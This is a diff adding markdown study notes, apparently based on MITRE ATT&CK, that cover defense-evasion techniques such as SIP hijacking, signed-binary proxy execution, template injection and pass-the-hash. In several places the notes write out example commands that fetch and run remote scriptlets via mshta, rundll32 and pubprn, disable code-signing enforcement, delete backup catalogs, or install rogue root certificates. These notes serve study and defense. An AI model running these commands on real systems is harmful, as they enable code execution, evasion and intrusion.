@@ -1544,103 +1544,574 @@ In user mode, Windows Authenticode digital signatures are used to verify a file'
 Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks
 
 
-Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all) and are identified by globally unique identifiers (GUIDs).
+Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) to provide a layer of abstraction between API functions and files
+* SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures
+* Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all) and are identified by globally unique identifiers (GUIDs)
 
-Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: 
+Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system
+* Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious  code as signed by: 
 
-Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP [6] (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
-Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP [6] (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
-Modifying the DLL and Function Registry values in HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
-Note: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.
-Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. [3]
+* Modifying the Dll and *FuncName* Registry values in `HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{SIP_GUID}` that point to the dynamic link library (DLL) providing a SIP’s `CryptSIPDllGetSignedDataMsg` function, which retrieves an encoded digital certificate from a signed file
+  * By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature
+    * Attackers can apply an acceptable signature value to all files using that SIP (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file)
+  
+* Modifying the Dll and *FuncName* Registry values in `HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{SIP_GUID}` that point to the DLL providing a SIP’s `CryptSIPDllVerifyIndirectData` function, which validates a file’s computed hash against the signed hash value
+  * By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (with or without hijacking the previously mentioned *CryptSIPDllGetSignedDataMsg* function)
+    * This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk
+  
+* Modifying the DLL and Function Registry values in `HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{trust provider GUID}` that point to the DLL providing a trust provider’s *FinalPolicy* function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made
+  * Similar to hijacking SIP’s *CryptSIPDllVerifyIndirectData* function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex)
+
+Note: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking
+
+
+Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation 
 <br>
 
 ## Install Root Certificate
+**Root Certificates:** Used in public key cryptography to identify a root CA. When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate
+* Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers
 
+
+Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. 
+
+A typical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications. 
+
+Root certificates and their associated chains can also be cloned and reinstalled
+* Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence
+
+**In macOS**, the Ay MaMi malware uses `/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert` to install a malicious certificate as a trusted root certificate into the system keychain
 <br>
 
 ## Mark-of-the-Web Bypass
+Attackers may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls
 
+**In Windows**, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named `Zone.Identifier` with a specific value known as the MOTW
+* Files that are tagged with MOTW are protected and cannot perform certain actions
+  * Starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View
+  * Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables
+  * If the file in not known/trusted, SmartScreen will prevent the execution and warn the user not to run it
+
+Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW
+* Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted
+* **MOTW** A NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections
 <br>
 
 ## Code Signing Policy Modification
+Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with
+* Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system
 
+Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS
+* Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed DLLs to execute on a system
+* Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions
+
+Adversaries may modify code signing policies in a number of ways, including through use of CLI or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory
+* Examples of commands that can modify the code signing policy of a system include `bcdedit.exe -set TESTSIGNING ON` on Windows and `csrutil disable` on macOS
+  
+Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system
+* Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode
+* Adversaries may attempt to remove such artifacts
+
+To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver
 
 <hr>
 
 # System Binary Proxy Execution
+Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system
 
+Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.
+
+Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands. 
 <br>
+
+## Compiled HTML File
+Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code
+* CHM files are commonly distributed as part of the Microsoft HTML Help system
+* CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages 
+
+CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe)
+
+A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution
+* CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe
+<br>
+
+## Control Panel
+Adversaries may abuse *control.exe* to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings
+
+Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function
+* For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel
+* Control Panel items can be executed directly from the command line, programmatically via an API call, or by simply double-clicking the file
+
+Malicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware
+* Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists
+
+Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to `HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls`
+* Even when these registered DLLs do not comply with the CPL file specification and do not export *CPlApplet* functions, they are loaded and executed through its `DllEntryPoint` when Control Panel is executed
+* CPL files not exporting CPlApplet are not directly executable
+<br>
+
+## CMSTP
+**Microsoft Connection Manager Profile Installer (CMSTP.exe):** A CLI program used to install Connection Manager service profiles
+* CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections
+* Adversaries may abuse CMSTP to proxy execution of malicious code
+
+
+Adversaries may supply CMSTP.exe with INF files infected with malicious commands
+* Similar to Regsvr32 / "Squiblydoo", CMSTP.exe may be abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers
+* This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft
+
+CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface
+<br>
+
+## InstallUtil
+**InstallUtil:** A CLI utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries
+* The **InstallUtil** binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: `C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe`
+Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility
+
+
+**InstallUtil** may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute `System.ComponentModel.RunInstaller(true)`
+<br>
+
+## Mshta
+Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code
+
+**Mshta.exe:** A utility that executes Microsoft HTML Applications (HTA) files
+* HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser
+
+* Execute files via **mshta.exe** through an inline script: `mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`
+
+* Executed files directly from URLs: `mshta http[:]//webserver/payload[.]hta`
+
+**Mshta.exe** can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings
+<br>
+
+## Msiexec
+**Msiexec.exe:** A CLI utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)
+* The Msiexec.exe binary may also be digitally signed by Microsoft
+
+Adversaries may abuse msiexec.exe to proxy execution of malicious payloads
+* Adversaries may abuse msiexec.exe to launch local or network accessible MSI files
+* Msiexec.exe can also execute DLLs
+  * Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse
+* Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled
+<br>
+
+## Odbcconf
+**Odbcconf.exe:** A Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names -- The Odbcconf.exe binary may be digitally signed by Microsoft
+
+Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads
+* Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse
+* Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: `odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"})`
+<br>
+
+## Regsvcs/Regasm
+**Regsvcs & Regasm:** Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.
+
+
+
+Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. 
+
+Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: `ComRegisterFunction` or `ComUnregisterFunction` respectively
+* The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute
+<br>
+
+## Regsvr32
+**Regsvr32.exe:** A CLI program used to register and unregister object linking and embedding controls, including DLLs on Windows systems
+
+Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations
+* Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions
+* Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a URL to file on an external Web server as an argument during invocation
+  * This method makes no changes to the Registry as the COM object is not actually registered, only executed
+  * This variation of the technique is often referred to as a *Squiblydoo* and has been used in campaigns targeting governments
+* Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking
+<br>
+
+## Rundll32
+Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations
+* Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction})
+
+Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`
+* Double-clicking a .cpl file also causes rundll32.exe to execute
+
+Rundll32 can also be used to execute scripts such as JavaScript -- `rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"` 
+
+Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names
+* As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command `rundll32.exe ExampleDLL.dll, ExampleFunction`, rundll32.exe would first attempt to execute `ExampleFunctionW`, or failing that `ExampleFunctionA`, before loading ExampleFunction)
+* Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending `W` and/or `A` to harmless ones.
+* DLL functions can also be exported and executed by an ordinal number (ex: `rundll32.exe file.dll,#1`)
+
+Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload
+<br>
+
+## Verclsid
+**Verclsid.exe** is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell
+
+Adversaries may abuse verclsid.exe to execute malicious payloads
+* This may be achieved by running `verclsid.exe /S /C {CLSID}`, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects
+* COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32)
+* Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse
+<br>
+
+## Mavinject
+**Mavinject.exe:** The Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V)6
+
+Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. `C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL`)
+* Mavinject.exe can also be abused to perform import descriptor injection via its `/HMODULE` command-line parameter (ex. `mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER`)
+  * This command would inject an import table entry consisting of the specified DLL into the module at the given base address
+<br>
+
+## MMC
+**Microsoft Management Console (MMC):** A binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt
+* MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins
+  * These snap-ins may be used to manage Windows systems locally or remotely
+  * MMC can also be used to open Microsoft created .msc files to manage system configuration
+
+
+* `mmc C:\Users\foo\admintools.msc /a`: Opens a custom, saved console msc file in author mode
+* `mmc gpedit.msc`: Opens the Group Policy Editor application window.
+
+Adversaries may use MMC commands to perform malicious tasks
+* `mmc wbadmin.msc delete catalog -quiet`: Deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the use
+* **Note:** `wbadmin.msc` may only be present by default on Windows Server OS
+
+Adversaries may also abuse MMC to execute malicious .msc files
+* First create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object
+* Then, adversaries may create custom consoles with the "Link to Web Address" snap-in that is linked to the malicious CLSID subkey
+* Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: `mmc.exe -Embedding C:\path\to\test.msc`
 <hr>
 
 
 # System Script Proxy Execution
-
+Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.
+* This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems
 <br>
+
+## PubPrn
+**PubPrn.vbs:** A Visual Basic script that publishes a printer to AD Domain Services
+* The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via `Cscript.exe`
+  * `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com`: Publishes a printer within the specified domain
+
+Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites
+* Adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site
+  * `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`
+    * This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script
+
+In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site
+* This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the script: moniker which could be used to reference remote code via HTTP(S)
 <hr>
 
 
 # Template Injection
+Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts
+* Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents to replace older binary formats
+* OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered
 
+Properties within parts may reference shared public resources accessed via online URLs
+* Template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded
+
+Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents
+* Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded
+* These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched
+  * Examples have been seen in the wild where template injection was used to load malicious code containing an exploit
+
+Adversaries may also modify the `*\template` control word within an *.rtf* file to similarly conceal then download malicious code
+* This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an *.rtf* file is opened
+  * However, adversaries may alter the bytes of an existing *.rtf* file to insert a template control word field to include a URL resource of a malicious payload
+
+This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt
 <br>
+
 <hr>
 
-
 # Traffic Signaling
+**Traffic Signaling:** Involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task
+* This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control
+* Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics
+  * After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software
 
+
+Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s)
+
+The observation of the signal packets to trigger the communication can be conducted through different methods
+* One means is to use the libpcap libraries to sniff for the packets in question
+* Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs
+
+On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet
+* Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities
+* Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives
+* To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture
+
+**Wake-on-LAN:** A hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement
+* Adversaries may also use the Wake-on-LAN feature to turn on powered off systems
 <br>
+
+## Port Knocking
+Adversaries may use port knocking to hide open ports used for persistence or command and control
+* To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports
+* After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software
+
+This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.
+
+The observation of the signal packets to trigger the communication can be conducted through different methods
+* One means is to use the libpcap libraries to sniff for the packets in question
+* Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs
 <hr>
 
 
 # Trusted Developer Utilities Proxy Execution
-
+Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads
+* There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering
+* These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions
 <br>
-<hr>
 
+## MSBuild
+**MSBuild.exe (Microsoft Build Engine):** A software build platform used by Visual Studio -- It handles XML formatted project files that define requirements for loading and building various platforms and configurations
+
+
+Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility
+* The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file
+* MSBuild will compile and execute the inline task
+* MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution
+<hr>
 
 # Unused/Unsupported Cloud Regions
+Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.
 
+Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements
+* Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions
+  * If an adversary creates resources in an unused region, they may be able to operate undetected
+
+A variation on this behavior takes advantage of differences in functionality across cloud regions
+* An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity
+
+An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used
 <br>
-<hr>
 
+<hr>
 
 # Use Alternate Authentication Material
+Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.)
+* Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s)
+* Alternate authentication material may also be generated during the identity creation process 
 
+Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s)
+* Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques
+* By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors
 <br>
+
+## Application Access Token
+Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and SaaS
+
+
+
+### AWS and GCP environments
+Adversaries can trigger a request for a short-lived access token with the privileges of another user account
+* The adversary can then use this token to request data or perform actions the original account could not
+* If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges
+
+### OAuth
+One commonly implemented framework that issues tokens to users for access to systems
+* These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform
+* Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user
+* Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application
+
+### Example
+With a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded
+* With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration
+
+Compromised access tokens may be used as an initial step in compromising other services
+* If a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines
+* Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords
+* Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow
+<br>
+
+## Pass the Hash (PTH)
+**Pass the hash (PTH):** A method of authenticating as a user without having access to the user's cleartext password
+* This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash
+
+When performing PTH, valid password hashes for the account being used are captured using a Credential Access technique
+* Captured hashes are used with PTH to authenticate as that user
+* Once authenticated, PTH may be used to perform actions on local or remote systems
+
+Adversaries may also use stolen password hashes to "Overpass the Hash (OTH)"
+* Similar to PTH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket
+  * This ticket can then be used to perform Pass the Ticket (PTT) attacks
+<br>
+
+## Pass the Ticket (PTT)
+**Pass the ticket (PTH):** A method of authenticating to a system using Kerberos tickets without having access to an account's password -- Kerberos authentication can be used as the first step to lateral movement to a remote system
+
+When preforming PTH, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping
+* A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access
+* A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access
+
+A **Silver Ticket** can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint)
+
+A **Golden Ticket** can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in AD
+
+Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys
+* For example, OTH involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket
+<br>
+
+## Web Session Cookie
+Adversaries can use stolen session cookies to authenticate to web applications and services -- This technique bypasses some multi-factor authentication protocols since the session is already authenticated
+
+Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently
+* Cookies are often valid for an extended period of time, even if the web application is not actively used
+* After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active
+
 <hr>
 
-
 # Valid Accounts
+Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.
 
+In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[1]
+
+The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[2]
 <br>
+
+## Default Account 
+Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems
+* Default accounts also include default factory/provider set accounts on other types of systems, software, or devices
+* Note: Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial
+  * Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary
+  * Attackers may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services
+<br>
+
+## Domain Account 
+Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain -- Domain accounts can cover users, administrators, and services
+
+Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain
+<br>
+
+## Local Account 
+Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service
+
+Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping
+* Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement
+<br>
+
+## Cloud Account
+Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application
+* Cloud accounts may be federated with traditional identity management system
+
+Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases
